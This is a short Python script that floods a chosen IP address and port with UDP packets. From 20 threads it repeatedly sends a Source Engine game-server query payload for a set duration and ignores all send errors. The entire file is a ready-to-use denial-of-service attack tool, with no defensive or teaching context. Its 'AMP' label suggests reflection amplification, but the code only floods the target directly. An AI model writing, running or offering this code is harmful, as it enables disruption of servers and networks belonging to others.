import time
import socket
import threading
import random

AMP_PAYLOAD = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'

def attack_thread(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(AMP_PAYLOAD, (ip, port))
        except Exception:
            pass
        time.sleep(random.uniform(0.01, 0.05))

def run(ip, port, duration, stop_event, threads=20):
    end_time = time.time() + duration
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack_thread, args=(ip, port, stop_event))
        t.start()
        thread_list.append(t)
    while not stop_event.is_set() and time.time() < end_time:
        time.sleep(0.5)
    stop_event.set()
    for t in thread_list:
        t.join()
